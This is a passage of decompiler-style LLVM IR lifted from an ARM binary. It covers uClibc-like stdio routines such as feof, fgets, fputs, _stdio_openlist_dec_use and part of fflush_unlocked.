  %v0_10f80 = load i32, i32* %r2.global-to-local, align 4
  %v3_10f80 = mul i32 %v0_10f80, 4
  store i32 %v3_10f80, i32* @r2, align 4
  %v0_10f84 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f84 = add i32 %v0_10f84, 40
  store i32 %v1_10f84, i32* @r0, align 4
  %v2_10f88 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10f88, i32* @r1, align 4
  %v0_10f8c = call i32 @memcpy()
  store i32 %v0_10f8c, i32* %r0.global-to-local, align 4
  %v0_10f90.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10f90

dec_label_pc_10f90:                               ; preds = %dec_label_pc_10f60, %dec_label_pc_10f78
  %v2_10fac = phi i32 [ %v0_10f90.pre, %dec_label_pc_10f78 ], [ %v0_10f60, %dec_label_pc_10f60 ]
  %v1_10f90 = add i32 %v2_10fac, 16
  %v2_10f90 = inttoptr i32 %v1_10f90 to i32*
  %v3_10f90 = load i32, i32* %v2_10f90, align 4
  store i32 %v3_10f90, i32* %r3.global-to-local, align 4
  %v1_10f94 = and i32 %v3_10f90, 128
  %v2_10f94 = icmp eq i32 %v1_10f94, 0
  br i1 %v2_10f94, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_10f90
  store i32 %v2_10b38, i32* %r3.global-to-local, align 4
  %v2_10f9c = inttoptr i32 %v2_10fac to i32*
  %v3_10f9c = load i32, i32* %v2_10f9c, align 4
  %v2_10fa4.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_10fa4 = sub i32 %v2_10fa4.pre, %v2_10b38
  store i32 %v3_10fa4, i32* %r3.global-to-local, align 4
  %v5_10fa8 = mul i32 %v3_10fa4, 4
  %v6_10fa8 = add i32 %v5_10fa8, %v3_10f9c
  store i32 %v6_10fa8, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_10f90
  %v1_10fa041 = load i32, i32* %r6.global-to-local, align 4
  %v2_10fa042 = add i32 %v1_10fa041, 1
  store i32 %v2_10fa042, i32* %r3.global-to-local, align 4
  %v3_10fac = inttoptr i32 %v2_10fac to i32*
  store i32 %v2_10fa042, i32* %v3_10fac, align 4
  %v0_10fb0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_10fb8 = phi i32 [ %v2_10fac, %.thread44 ], [ %v0_10fb0.pre, %.thread46 ]
  %v1_10fb0 = add i32 %v1_10fb8, 28
  %v2_10fb0 = inttoptr i32 %v1_10fb0 to i32*
  %v3_10fb0 = load i32, i32* %v2_10fb0, align 4
  store i32 %v3_10fb0, i32* %r3.global-to-local, align 4
  %v1_10fb4 = add i32 %v3_10fb0, 2
  store i32 %v1_10fb4, i32* %r0.global-to-local, align 4
  %v0_10fb8 = load i32, i32* %sb.global-to-local, align 4
  %v2_10fb8 = add i32 %v1_10fb8, 24
  %v3_10fb8 = inttoptr i32 %v2_10fb8 to i32*
  store i32 %v0_10fb8, i32* %v3_10fb8, align 4
  br i1 %v2_10f94, label %dec_label_pc_10fc8, label %bb147

bb147:                                            ; preds = %bb146
  %v1_10fbc = load i32, i32* @r2, align 4
  %v2_10fbc = load i32, i32* %r7.global-to-local, align 4
  %v3_10fbc = inttoptr i32 %v2_10fbc to i32*
  store i32 %v1_10fbc, i32* %v3_10fbc, align 4
  br label %dec_label_pc_10fc8

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10b80, %dec_label_pc_10c8c, %dec_label_pc_10d3c, %dec_label_pc_10d10, %dec_label_pc_10d1c, %dec_label_pc_10c5c, %dec_label_pc_10efc, %dec_label_pc_10ea8, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %bb147, %bb146, %dec_label_pc_10fc4
  %v2_10fcc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10fcc, i32* @r4, align 4
  store i32 %v6_10b30, i32* @r5, align 4
  %v26_10fcc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_10fcc

; uselistorder directives
  uselistorder i32 %v3_10fa4, { 1, 0 }
  uselistorder i32 %v1_10f64, { 1, 2, 0 }
  uselistorder i32 %v0_10f18, { 1, 2, 0 }
  uselistorder i32 %v2_10ef4, { 1, 0 }
  uselistorder i32 %v1_10ef4, { 1, 0, 2 }
  uselistorder i32 %v0_10f14, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_10e58, { 1, 2, 0 }
  uselistorder i32 %v3_10e40, { 1, 0 }
  uselistorder i32 %v3_10e38, { 1, 0 }
  uselistorder i32 %v2_10e18, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10e00, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10de4, { 1, 0, 2 }
  uselistorder i32 %v3_10dc4, { 2, 1, 0 }
  uselistorder i32 %v1_10d88, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10d5c, { 1, 0 }
  uselistorder i32 %v5_10cbc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10cbc, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_10c68, { 1, 0 }
  uselistorder i32 %v0_10c84, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10c4c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10c34, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_10c20, { 1, 2, 0 }
  uselistorder i32 %v0_10c98, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10bd4, { 1, 0 }
  uselistorder i32 %v1_10ba4, { 0, 2, 1 }
  uselistorder i32 %v25_10b30, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 4, 8, 5, 1, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 9, 12, 11, 0, 2, 13, 3, 4, 5, 15, 7, 8, 6, 1, 10 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19f48.375 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_19f58.373 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_19f74.367 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_19f34.365 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_10fc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10fc4, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_10f90, { 1, 0 }
  uselistorder label %dec_label_pc_10f60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f4c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10f08, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_10ec0, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d74, { 1, 0 }
  uselistorder label %dec_label_pc_10d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10cfc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10c7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c78, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10bd8, { 1, 0 }
  uselistorder label %dec_label_pc_10bc8, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10ff4 = load i32, i32* @r4, align 4
  store i32 %v3_10ff4, i32* %stack_var_-16, align 4
  %v2_10ff8 = add i32 %tmp, 52
  %v3_10ff8 = inttoptr i32 %v2_10ff8 to i32*
  %v4_10ff8 = load i32, i32* %v3_10ff8, align 4
  store i32 %v4_10ff8, i32* %r6.global-to-local, align 4
  %v2_11000 = ptrtoint i32* %stack_var_-32 to i32
  %v2_11004 = icmp eq i32 %v4_10ff8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_11000, i32* @r0, align 4
  br i1 %v2_11004, label %dec_label_pc_1101c, label %dec_label_pc_11038

dec_label_pc_1101c:                               ; preds = %entry
  %v1_11024 = call i32 @__pthread_return_void()
  %v1_11034 = call i32 @__pthread_return_0()
  %v0_11038.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_11040.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11038

dec_label_pc_11038:                               ; preds = %entry, %dec_label_pc_1101c
  %v0_11040 = phi i32 [ %v4_10ff8, %entry ], [ %v0_11040.pre, %dec_label_pc_1101c ]
  %v0_11038 = phi i32 [ %tmp, %entry ], [ %v0_11038.pre, %dec_label_pc_1101c ]
  %v1_11038 = add i32 %v0_11038, 1
  %v2_11038 = inttoptr i32 %v1_11038 to i8*
  %v3_11038 = load i8, i8* %v2_11038, align 1
  %v4_11038 = zext i8 %v3_11038 to i32
  %v1_1103c = inttoptr i32 %v0_11038 to i8*
  %v2_1103c = load i8, i8* %v1_1103c, align 1
  %v3_1103c = zext i8 %v2_1103c to i32
  %v2_11040 = icmp eq i32 %v0_11040, 0
  %v4_1104c = mul nuw nsw i32 %v4_11038, 256
  %v5_1104c = or i32 %v3_1103c, %v4_1104c
  store i32 %v5_1104c, i32* %r4.global-to-local, align 4
  br i1 %v2_11040, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11038
  call void @__pseudo_branch(i32 79548)
  %v0_1105c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11038, %bb
  %v0_1105c = phi i32 [ %v5_1104c, %dec_label_pc_11038 ], [ %v0_1105c.pre, %bb ]
  %v1_1105c = and i32 %v0_1105c, 4
  %v2_11064 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11064, i32* @r4, align 4
  ret i32 %v1_1105c

; uselistorder directives
  uselistorder i32 %v0_11038, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11038, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11078 = load i32, i32* @r4, align 4
  store i32 %v3_11078, i32* %stack_var_-24, align 4
  %v6_11078 = load i32, i32* @r5, align 4
  %v9_11078 = load i32, i32* @r6, align 4
  %v12_11078 = load i32, i32* @r7, align 4
  %v1_1107c = add i32 %arg3, 52
  %v2_1107c = inttoptr i32 %v1_1107c to i32*
  %v3_1107c = load i32, i32* %v2_1107c, align 4
  store i32 %v3_1107c, i32* %r8.global-to-local, align 4
  %v2_11080 = ptrtoint i32* %stack_var_-40 to i32
  %v1_11084 = add i32 %arg3, 56
  store i32 %v1_11084, i32* @r5, align 4
  %v2_11088 = icmp eq i32 %v3_1107c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_11080, i32* @r0, align 4
  br i1 %v2_11088, label %dec_label_pc_110a8, label %dec_label_pc_110c4

dec_label_pc_110a8:                               ; preds = %entry
  %v1_110b0 = call i32 @__pthread_return_void()
  store i32 69828, i32* @lr, align 4
  %v1_110c0 = call i32 @__pthread_return_0()
  %v0_110c4.pre = load i32, i32* @r6, align 4
  %v0_110c8.pre = load i32, i32* @r4, align 4
  %v0_110cc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_110c4

dec_label_pc_110c4:                               ; preds = %entry, %dec_label_pc_110a8
  %v0_110cc = phi i32 [ %arg1, %entry ], [ %v0_110cc.pre, %dec_label_pc_110a8 ]
  %v0_110c8 = phi i32 [ %arg3, %entry ], [ %v0_110c8.pre, %dec_label_pc_110a8 ]
  %v0_110c4 = phi i32 [ %arg2, %entry ], [ %v0_110c4.pre, %dec_label_pc_110a8 ]
  %v3_110d0 = inttoptr i32 %v0_110cc to i8*
  %v4_110d0 = call i32 @__GI_fgets_unlocked(i8* %v3_110d0, i32 %v0_110c4, i32 %v0_110c8)
  %v0_110d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_110d4 = icmp eq i32 %v0_110d4, 0
  store i32 %v4_110d0, i32* %r4.global-to-local, align 4
  br i1 %v2_110d4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_110c4
  store i32 69872, i32* @lr, align 4
  call void @__pseudo_branch(i32 79548)
  %v0_110f0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_110c4, %bb
  %v0_110f0 = phi i32 [ %v4_110d0, %dec_label_pc_110c4 ], [ %v0_110f0.pre, %bb ]
  %v2_110f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_110f8, i32* @r4, align 4
  store i32 %v6_11078, i32* @r5, align 4
  store i32 %v9_11078, i32* @r6, align 4
  store i32 %v12_11078, i32* @r7, align 4
  ret i32 %v0_110f0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_110c4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1110c = load i32, i32* @r4, align 4
  store i32 %v3_1110c, i32* %stack_var_-20, align 4
  %v6_1110c = load i32, i32* @r5, align 4
  %v9_1110c = load i32, i32* @r6, align 4
  %v12_1110c = load i32, i32* @r7, align 4
  %v1_11110 = add i32 %arg2, 52
  %v2_11110 = inttoptr i32 %v1_11110 to i32*
  %v3_11110 = load i32, i32* %v2_11110, align 4
  store i32 %v3_11110, i32* @r7, align 4
  %v1_11114 = add i32 %arg2, 56
  store i32 %v1_11114, i32* @r5, align 4
  %v2_11118 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1111c = icmp eq i32 %v3_11110, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_11118, i32* @r0, align 4
  br i1 %v2_1111c, label %dec_label_pc_11138, label %dec_label_pc_11154

dec_label_pc_11138:                               ; preds = %entry
  %v1_11140 = call i32 @__pthread_return_void()
  store i32 69972, i32* @lr, align 4
  %v1_11150 = call i32 @__pthread_return_0()
  %v0_11154.pre = load i32, i32* @r4, align 4
  %v0_11158.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11154

dec_label_pc_11154:                               ; preds = %entry, %dec_label_pc_11138
  %v0_11158 = phi i32 [ %arg1, %entry ], [ %v0_11158.pre, %dec_label_pc_11138 ]
  %v0_11154 = phi i32 [ %arg2, %entry ], [ %v0_11154.pre, %dec_label_pc_11138 ]
  %v2_1115c = inttoptr i32 %v0_11158 to i8*
  %v3_1115c = call i32 @__GI_fputs_unlocked(i8* %v2_1115c, i32 %v0_11154)
  %v0_11160 = load i32, i32* @r7, align 4
  %v2_11160 = icmp eq i32 %v0_11160, 0
  store i32 %v3_1115c, i32* %r4.global-to-local, align 4
  br i1 %v2_11160, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11154
  call void @__pseudo_branch(i32 79548)
  %v0_1117c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11154, %bb
  %v0_1117c = phi i32 [ %v3_1115c, %dec_label_pc_11154 ], [ %v0_1117c.pre, %bb ]
  %v2_11184 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11184, i32* @r4, align 4
  store i32 %v6_1110c, i32* @r5, align 4
  store i32 %v9_1110c, i32* @r6, align 4
  store i32 %v12_1110c, i32* @r7, align 4
  ret i32 %v0_1117c

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11154, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_1119c = ptrtoint i32* %stack_var_-48 to i32
  %v2_111a0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_111a0, i32* @r0, align 4
  store i32 79548, i32* %r4.global-to-local, align 4
  %v1_111b4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r5.global-to-local, align 4
  %v1_111c4 = call i32 @__pthread_return_0()
  %v2_111cc = load i32, i32* @global_var_27550.311, align 4
  %v7_111d0 = icmp eq i32 %v2_111cc, 1
  br i1 %v7_111d0, label %dec_label_pc_111d8, label %dec_label_pc_11284

dec_label_pc_111d8:                               ; preds = %entry
  %v2_111dc = load i32, i32* @global_var_27554.316, align 4
  %tmp19 = icmp slt i32 %v2_111dc, 1
  br i1 %tmp19, label %dec_label_pc_11284, label %dec_label_pc_111e8

dec_label_pc_111e8:                               ; preds = %dec_label_pc_111d8
  store i32 %v2_1119c, i32* @r0, align 4
  %v1_111f8 = call i32 @__pthread_return_void()
  %v1_11204 = call i32 @__pthread_return_0()
  %v2_1120c = load i32, i32* bitcast (i32** @global_var_231d0.331 to i32*), align 4
  store i32 %v2_1120c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1125c3 = icmp eq i32 %v2_1120c, 0
  br i1 %v2_1125c3, label %dec_label_pc_11268, label %dec_label_pc_11218

dec_label_pc_11218:                               ; preds = %dec_label_pc_111e8, %dec_label_pc_11258
  %v1_11230 = phi i32 [ %v0_11258, %dec_label_pc_11258 ], [ %v2_1120c, %dec_label_pc_111e8 ]
  %v1_11218 = inttoptr i32 %v1_11230 to i8*
  %v2_11218 = load i8, i8* %v1_11218, align 1
  %v3_11218 = zext i8 %v2_11218 to i32
  %v1_1121c = add i32 %v1_11230, 1
  %v2_1121c = inttoptr i32 %v1_1121c to i8*
  %v3_1121c = load i8, i8* %v2_1121c, align 1
  %v4_1121c = zext i8 %v3_1121c to i32
  %v4_11220 = mul nuw nsw i32 %v4_1121c, 256
  %v5_11220 = or i32 %v4_11220, %v3_11218
  %v2_11224 = and i32 %v5_11220, 32816
  %v7_11228 = icmp eq i32 %v2_11224, 48
  %v1_1122c = add i32 %v1_11230, 32
  %v2_1122c = inttoptr i32 %v1_1122c to i32*
  %v3_1122c = load i32, i32* %v2_1122c, align 4
  store i32 %v3_1122c, i32* %r5.global-to-local, align 4
  br i1 %v7_11228, label %dec_label_pc_11238, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_11218
  store i32 %v1_11230, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11258

dec_label_pc_11238:                               ; preds = %dec_label_pc_11218
  %v0_11238 = load i32, i32* %r6.global-to-local, align 4
  %v2_11238 = icmp eq i32 %v0_11238, 0
  br i1 %v2_11238, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_11238
  %v3_11240 = add i32 %v0_11238, 32
  %v4_11240 = inttoptr i32 %v3_11240 to i32*
  store i32 %v3_1122c, i32* %v4_11240, align 4
  %v0_11248.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_11238
  store i32 %v3_1122c, i32* bitcast (i32** @global_var_231d0.331 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_11248 = phi i32 [ %v0_11248.pre, %.thread ], [ %v1_11230, %.thread1 ]
  %v1_11248 = add i32 %v0_11248, 1
  %v2_11248 = inttoptr i32 %v1_11248 to i8*
  %v3_11248 = load i8, i8* %v2_11248, align 1
  %v1_1124c = and i8 %v3_11248, 32
  %v1_11254 = icmp ne i8 %v1_1124c, 0
  call void @__pseudo_cond_branch(i1 %v1_11254, i32 ptrtoint (i32* @global_var_126e8.313 to i32))
  %v0_11258.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %.thread12, %bb
  %v0_11258 = phi i32 [ %v0_11258.pre, %bb ], [ %v3_1122c, %.thread12 ]
  store i32 %v0_11258, i32* %r4.global-to-local, align 4
  %v2_1125c = icmp eq i32 %v0_11258, 0
  br i1 %v2_1125c, label %dec_label_pc_11268, label %dec_label_pc_11218

dec_label_pc_11268:                               ; preds = %dec_label_pc_11258, %dec_label_pc_111e8
  store i32 %v2_1119c, i32* @r0, align 4
  %v1_11278 = call i32 @__pthread_return_void()
  %v0_11280 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11280, i32* @global_var_27554.316, align 4
  %v2_11288.pre = load i32, i32* @global_var_27550.311, align 4
  br label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %entry, %dec_label_pc_111d8, %dec_label_pc_11268
  %v2_11288 = phi i32 [ %v2_111cc, %entry ], [ 1, %dec_label_pc_111d8 ], [ %v2_11288.pre, %dec_label_pc_11268 ]
  %v1_1128c = add i32 %v2_11288, -1
  store i32 %v1_1128c, i32* @global_var_27550.311, align 4
  store i32 %v2_111a0, i32* @r0, align 4
  store i32 70312, i32* @lr, align 4
  %v1_112a4 = call i32 @__pthread_return_void()
  ret i32 %v1_112a4

; uselistorder directives
  uselistorder i32 %v0_11258, { 2, 1, 0 }
  uselistorder i32 %v3_1122c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11230, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_27554.316, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11284, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11258, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_11218, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_112d8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_231d0.331 to i32), i32* %r3.global-to-local, align 4
  %v10_112e0 = icmp eq i8* %arg1, bitcast (i32** @global_var_231d0.331 to i8*)
  store i1 %v10_112e0, i1* %cpsr_z.global-to-local, align 1
  %.v1_112e4 = select i1 %v10_112e0, i32 0, i32 %tmp
  store i32 %.v1_112e4, i32* %r8.global-to-local, align 4
  %v2_112ec = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_112e0, label %bb, label %dec_label_pc_112f8

bb:                                               ; preds = %entry
  store i32 %.v1_112e4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11304

dec_label_pc_112f8:                               ; preds = %entry
  %v2_112f8 = icmp eq i32 %.v1_112e4, 0
  store i1 %v2_112f8, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_112f8, label %dec_label_pc_11304, label %dec_label_pc_11450

dec_label_pc_11304:                               ; preds = %bb, %dec_label_pc_112f8
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  %v1_11318 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_231ec.309 to i32), i32* %r0.global-to-local, align 4
  %v1_11328 = call i32 @__pthread_return_0()
  %v2_11330 = load i32, i32* @global_var_27550.311, align 4
  %v1_11334 = add i32 %v2_11330, 1
  store i32 %v1_11334, i32* %r3.global-to-local, align 4
  store i32 %v1_11334, i32* @global_var_27550.311, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  %v1_1134c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  %v1_11360 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_231d4.328 to i32), i32* %r0.global-to-local, align 4
  %v1_1136c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_231d0.331 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1137c = load i32, i32* bitcast (i32** @global_var_231d0.331 to i32*), align 4
  store i32 %v2_1137c, i32* @r6, align 4
  %v1_11384 = call i32 @__pthread_return_void()
  store i32 %v1_11384, i32* %r0.global-to-local, align 4
  store i32 %v2_112ec, i32* @r4, align 4
  %v0_1138c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1138c, i32* @r5, align 4
  %v0_11440.pr = load i32, i32* @r6, align 4
  %v2_1144025 = icmp eq i32 %v0_11440.pr, 0
  store i1 %v2_1144025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1144025, label %dec_label_pc_11448, label %dec_label_pc_11394

dec_label_pc_11394:                               ; preds = %dec_label_pc_11304, %.thread11
  %v0_113b0 = phi i32 [ %v3_1143c, %.thread11 ], [ %v0_11440.pr, %dec_label_pc_11304 ]
  %v1_11394 = inttoptr i32 %v0_113b0 to i8*
  %v2_11394 = load i8, i8* %v1_11394, align 1
  %v3_11394 = zext i8 %v2_11394 to i32
  store i32 %v3_11394, i32* %r3.global-to-local, align 4
  %v1_11398 = and i32 %v3_11394, 64
  %v2_11398 = icmp eq i32 %v1_11398, 0
  store i1 %v2_11398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11398, label %.thread11, label %dec_label_pc_113a0

dec_label_pc_113a0:                               ; preds = %dec_label_pc_11394
  %v2_113a4 = load i32, i32* @global_var_23204.322, align 4
  store i32 %v2_113a4, i32* %r3.global-to-local, align 4
  %v7_113a8 = icmp eq i32 %v2_113a4, 2
  store i1 %v7_113a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113a8, label %dec_label_pc_113dc, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_113a0
  %v1_113b0 = add i32 %v0_113b0, 56
  store i32 %v1_113b0, i32* @r4, align 4
  store i32 %v2_112ec, i32* @r0, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r1.global-to-local, align 4
  %v1_113c8 = call i32 @__pthread_return_void()
  %v0_113cc = load i32, i32* @r4, align 4
  store i32 %v0_113cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  %v1_113d8 = call i32 @__pthread_return_0()
  store i32 %v1_113d8, i32* %r0.global-to-local, align 4
  %v0_113dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_113dc

dec_label_pc_113dc:                               ; preds = %dec_label_pc_113a0, %dec_label_pc_113b0
